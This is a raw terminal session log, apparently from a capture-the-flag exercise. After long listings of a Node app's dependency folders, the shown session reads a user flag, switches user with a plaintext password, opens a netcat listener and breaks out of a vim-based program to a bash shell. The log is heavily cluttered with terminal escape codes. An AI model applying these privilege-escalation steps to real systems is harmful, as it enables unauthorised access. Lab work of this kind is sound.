+-rw-r--r--  1 marston marston 2286 Oct 26  1985 index.d.ts
+-rw-r--r--  1 marston marston 6059 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/setprototypeof:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3769 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  727 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston  850 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston   93 Oct 26  1985 index.d.ts
+-rw-r--r--  1 marston marston  384 Oct 26  1985 index.js
+drwxr-xr-x  2 marston marston 4096 Oct 26  1985 test
+
+/home/marston/app/node_modules/setprototypeof/test:
+total 12
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Oct 26  1985 .
+-rw-r--r-- 1 marston marston  690 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/statuses:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3700 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1023 Mar 28  2018 HISTORY.md
+-rw-r--r--  1 marston marston 1821 Mar 28  2018 codes.json
+-rw-r--r--  1 marston marston 1172 Oct 20  2017 LICENSE
+-rw-r--r--  1 marston marston 2088 Oct 20  2017 index.js
+-rw-r--r--  1 marston marston 3458 Oct 20  2017 README.md
+
+/home/marston/app/node_modules/safe-buffer:
+total 52
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  3403 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  1081 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 19555 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston  8738 Oct 26  1985 index.d.ts
+-rw-r--r--  1 marston marston  1529 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/vary:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2799 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  792 Sep 24  2017 HISTORY.md
+-rw-r--r--  1 marston marston 2930 Sep 23  2017 index.js
+-rw-r--r--  1 marston marston 1094 Mar 20  2017 LICENSE
+-rw-r--r--  1 marston marston 2716 Mar 20  2017 README.md
+
+/home/marston/app/node_modules/accepts:
+total 36
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3871 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 4972 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1167 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 4081 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 5252 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/bytes:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3713 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1581 Oct 26  1985 History.md
+-rw-r--r--  1 marston marston 1153 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 3890 Oct 26  1985 Readme.md
+-rw-r--r--  1 marston marston 3469 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/content-disposition:
+total 40
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  4009 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston   952 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston  1094 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston  5237 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 10594 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/cookie:
+total 36
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3788 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 2698 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1175 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 8809 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 4037 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/etag:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2947 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 4198 Sep 13  2017 README.md
+-rw-r--r--  1 marston marston 1732 Sep 13  2017 HISTORY.md
+-rw-r--r--  1 marston marston 2479 Sep 13  2017 index.js
+-rw-r--r--  1 marston marston 1094 Feb 19  2017 LICENSE
+
+/home/marston/app/node_modules/finalhandler:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4027 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 4080 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1119 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 4012 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 6518 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/fresh:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3049 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1500 Sep 14  2017 HISTORY.md
+-rw-r--r--  1 marston marston 2711 Sep 14  2017 index.js
+-rw-r--r--  1 marston marston 3374 Sep 14  2017 README.md
+-rw-r--r--  1 marston marston 1174 Feb 19  2017 LICENSE
+
+/home/marston/app/node_modules/http-errors:
+total 40
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4287 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 3145 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1168 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 5554 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 5878 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/mime-types:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4059 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 7806 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1167 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 3484 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 3663 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/on-finished:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2551 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1694 May 27  2015 HISTORY.md
+-rw-r--r--  1 marston marston 4886 May 26  2015 README.md
+-rw-r--r--  1 marston marston 3686 May 26  2015 index.js
+-rw-r--r--  1 marston marston 1167 Aug 16  2014 LICENSE
+
+/home/marston/app/node_modules/parseurl:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3942 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1043 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1173 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 4094 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 2809 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/path-to-regexp:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4581 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  694 Jul 28  2015 History.md
+-rw-r--r--  1 marston marston 3328 Jul 28  2015 index.js
+-rw-r--r--  1 marston marston 1102 Jul 28  2015 Readme.md
+-rw-r--r--  1 marston marston 1103 Jul 28  2015 LICENSE
+
+/home/marston/app/node_modules/proxy-addr:
+total 36
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3866 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 2869 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1094 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 4400 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 6000 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/range-parser:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4323 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  917 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1178 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 2278 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 2900 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/serve-static:
+total 44
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  3974 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 10083 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston  1189 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston  7783 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston  4570 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/type-is:
+total 40
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3949 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 5447 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1172 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 5183 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 5562 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/content-type:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2900 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  436 Sep 11  2017 HISTORY.md
+-rw-r--r--  1 marston marston 4809 Sep 11  2017 index.js
+-rw-r--r--  1 marston marston 1089 Sep 11  2017 LICENSE
+-rw-r--r--  1 marston marston 2796 Sep 11  2017 README.md
+
+/home/marston/app/node_modules/encodeurl:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2809 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  238 Jan 22  2018 HISTORY.md
+-rw-r--r--  1 marston marston 1586 Jan 22  2018 index.js
+-rw-r--r--  1 marston marston 1089 Jan 22  2018 LICENSE
+-rw-r--r--  1 marston marston 3855 Jan 22  2018 README.md
+
+/home/marston/app/node_modules/forwarded:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2821 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  306 Sep 15  2017 HISTORY.md
+-rw-r--r--  1 marston marston 1360 Sep 15  2017 index.js
+-rw-r--r--  1 marston marston 1637 Sep 15  2017 README.md
+-rw-r--r--  1 marston marston 1094 Sep 14  2017 LICENSE
+
+/home/marston/app/node_modules/inherits:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2134 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  192 Sep  7  2016 inherits.js
+-rw-r--r--  1 marston marston  749 Aug 19  2013 LICENSE
+-rw-r--r--  1 marston marston  672 May 16  2013 inherits_browser.js
+-rw-r--r--  1 marston marston 1625 May 16  2013 README.md
+
+/home/marston/app/node_modules/media-typer:
+total 32
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2234 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  461[K-rw-r--r--  1 marston marston  461[K-rw-r--r--  1 marston marston  461 Sep  8  2014 HISTORY.md
+-rw-r--r--  1 marston marston 6375 Sep  8  2014 index.js
+-rw-r--r--  1 marston marston 2371 Sep  8  2014 README.md
+-rw-r--r--  1 marston marston 1089 Sep  8  2014 LICENSE
+
+/home/marston/app/node_modules/merge-descriptors:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3957 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  363 Jan 17  2016 HISTORY.md
+-rw-r--r--  1 marston marston 1167 Jan 17  2016 LICENSE
+-rw-r--r--  1 marston marston 1215 Jan 17  2016 index.js
+-rw-r--r--  1 marston marston 1213 May 22  2015 README.md
+
+/home/marston/app/node_modules/methods:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2756 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  427 Jan 18  2016 HISTORY.md
+-rw-r--r--  1 marston marston 1694 Jan 18  2016 README.md
+-rw-r--r--  1 marston marston 1180 Jan 18  2016 LICENSE
+-rw-r--r--  1 marston marston 1040 Jan 18  2016 index.js
+
+/home/marston/app/node_modules/unpipe:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2216 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston   59 Jun 14  2015 HISTORY.md
+-rw-r--r--  1 marston marston 1114 Jun 14  2015 LICENSE
+-rw-r--r--  1 marston marston 1250 Jun 14  2015 README.md
+-rw-r--r--  1 marston marston 1118 Jun 14  2015 index.js
+
+/home/marston/app/node_modules/utils-merge:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2311 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston   79 Sep 20  2017 .npmignore
+-rw-r--r--  1 marston marston 1319 Sep 20  2017 README.md
+-rw-r--r--  1 marston marston 1084 Sep 20  2017 LICENSE
+-rw-r--r--  1 marston marston  381 Sep 20  2017 index.js
+
+/home/marston/app/node_modules/cookie-signature:
+total 28
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2086 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  695 Feb  3  2015 History.md
+-rw-r--r--  1 marston marston 1230 Feb  3  2015 index.js
+-rw-r--r--  1 marston marston 1490 Jun 19  2014 Readme.md
+-rw-r--r--  1 marston marston   29 Jan 28  2014 .npmignore
+
+/home/marston/app/node_modules/ms:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2239 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1721 May 16  2017 readme.md
+-rw-r--r--  1 marston marston 2764 May 16  2017 index.js
+-rw-r--r--  1 marston marston 1077 May 16  2017 license.md
+
+/home/marston/app/node_modules/array-flatten:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2178 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1195 Jul  9  2015 array-flatten.js
+-rw-r--r--  1 marston marston 1245 May  9  2015 README.md
+-rw-r--r--  1 marston marston 1103 Mar 15  2014 LICENSE
+
+/home/marston/app/node_modules/destroy:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2360 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 2185 Jan 13  2016 README.md
+-rw-r--r--  1 marston marston 1043 Jan 13  2016 index.js
+-rw-r--r--  1 marston marston 1099 Aug 14  2014 LICENSE
+
+/home/marston/app/node_modules/ee-first:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2361 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1684 May 25  2015 index.js
+-rw-r--r--  1 marston marston 2617 May 25  2015 README.md
+-rw-r--r--  1 marston marston 1099 Aug 15  2014 LICENSE
+
+/home/marston/app/node_modules/toidentifier:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4039 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 1718 Jul  9  2018 README.md
+-rw-r--r--  1 marston marston  490 Jul  2  2018 index.js
+-rw-r--r--  1 marston marston 1108 Jul  2  2018 LICENSE
+
+/home/marston/app/node_modules/escape-html:
+total 24
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 2038 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  707 Sep  1  2015 Readme.md
+-rw-r--r--  1 marston marston 1362 Sep  1  2015 index.js
+-rw-r--r--  1 marston marston 1157 Sep  1  2015 LICENSE
+ls: cannot open directory '/home/marston/.config': Permission denied
+
+/home/marston/.local:
+total 12
+drwxr-xr-x 8 marston marston 4096 May 29  2021 ..
+drwxrwxr-x 3 marston marston 4096 Mar 11  2021 .
+drwx------ 3 marston marston 4096 Mar 11  2021 share
+ls: cannot open directory '/home/marston/.local/share': Permission denied
+
+/home/ArthurMorgan:
+total 32
+drwxr-xr-x 6 root         root         4096 Oct  4 14:23 ..
+drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4096 May 28  2021 .
+lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
+drwx------ 4 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .gnupg
+drwxr-x--- 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .config
+-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
+drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .local
+drwx------ 2 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .cache
+-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
+ls: cannot open directory '/home/ArthurMorgan/.gnupg': Permission denied
+ls: cannot open directory '/home/ArthurMorgan/.config': Permission denied
+
+/home/ArthurMorgan/.local:
+total 12
+drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4096 May 28  2021 ..
+drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .
+drwx------ 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 share
+ls: cannot open directory '/home/ArthurMorgan/.local/share': Permission denied
+ls: cannot open directory '/home/ArthurMorgan/.cache': Permission denied
+www-data@ip-10-80-141-176:/var/www/html/dev$ [Kwww-data@ip-10-80-141-176:/var/www/html/dev$ [K[?2004hwww-data@ip-10-80-141-176:/var/www/html/dev$ cd /home/ArthurMorgan[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home/ArthurMorgan
+[Kcd /home/ArthurMorgan[Kcd /home/ArthurMorgan[Kcd /home/ArthurMorgan
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+ideas  user.txt
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt[Kcat user.txt[Kcat user.txt
+ae39f419ce0a3a26f15db5aaa7e446ff
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 32
+drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4096 May 28  2021 .
+drwxr-xr-x 6 root         root         4096 Oct  4 14:23 ..
+lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
+drwx------ 2 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .cache
+drwxr-x--- 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .config
+drwx------ 4 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .gnupg
+drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .local
+-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
+-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ file ideS[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfile ideS
+[Kfile ideS
+ideS: cannot open `ideS' (No such file or directory)
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ FILE [K[K[K[K[Kfiles ideas[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfiles ideas
+[Kfiles ideas[Kfiles ideas[Kfiles ideas
+
+Command 'files' not found, did you mean:
+
+  command 'file' from deb file (1:5.38-4)
+  command 'file2' from deb file-kanji (1.1-16build1)
+
+Try: apt install <deb name>
+
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ su arthurmorgan[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu arthurmorgan
+[Ksu arthurmorgan[Ksu arthurmorgan[Ksu arthurmorgan
+su: user arthurmorgan does not exist
+www-data@ip-10-80-141-176:/home/ArthurMorgan$ [Kwww-data@ip-10-80-141-176:/home/ArthurMorgan$ [K[?2004hwww-data@ip-10-80-141-176:/home/ArthurMorgan$ su ArthurMorgan[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu ArthurMorgan
+[Ksu ArthurMorgan[Ksu ArthurMorgan[Ksu ArthurMorgan
+Password: [KPassword: [K[?2004hPassword: [7mDeadEye[27m[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hDeadEye
+[K
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kls
+ideas  user.txt
+$ [K$ [K[?2004h$ whoami[C[C[?2004l[C[C[K[?2004hwhoami
+[Kwhoami
+ArthurMorgan
+$ [K$ [K[?2004h$ [7mnc -nlvp 4545[27m[C[C[?2004l[C[C[K[?2004hnc -nlvp 4545
+[Knc -nlvp 4545
+Listening on 0.0.0.0 4545
+Connection received on 127.0.0.1 47490
+
+
+ideaBox
+1.Write
+2.Delete
+3.Steal others' Trash
+4.Show'nExit
+[K[K[?2004h4[?2004l[K[?2004h4
+[K4
+[K[m[m[0m[H[2J[24;1H"/tmp/data.txt"[K[m[m[0m[H[2J[24;1H"/tmp/data.txt"[K[m[m[0m[H[2J[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[m[m[0m[H[2J[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[?2004h[m[m[0m[H[2J[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~           
+                                                                    [4;1H~                                                 
+                              [5;1H~                                                                               [6;1H~      
+                                                                         [7;1H~                                            
+                                   [8;1H~                                                                               [9;1H~ 
+                                                                              [10;1H~                                       
+                                        [11;1H~                                                                             
+  [12;1H~                                                                               [13;1H~                                  
+                                             [14;1H~                                                                        
+       [15;1H~                                                                               [16;1H~                             
+                                                  [17;1H~                                                                   
+            [18;1H~                                                                               [19;1H~                        
+                                                       [20;1H~                                                              
+                 [21;1H~                                                                               [22;1H~                   
+                                                            [23;1H~                                                         
+                      [0m[24;63H0,0-1[9CAll[1;1H[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7m:set shell=/bin/bash[27m:set shell=/bin/bash[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h:set shell=/bin/bash
+[K:set shell=/bin/bash
+[24;1H[K[24;1H:[K[24;1H[K[24;1H:[K[24;1H[K[24;1H:set shell=/bin/bash[62C0,0-1[9CAll[1;1H[K[62C0,0-1[9CAll[1;1H[K[?2004h[62C0,0-1[9CAll[1;1Hshell[?2004l[C[C[C[C[C[C[C[C[C[C[C[K[?2004hshell
+[Kshell
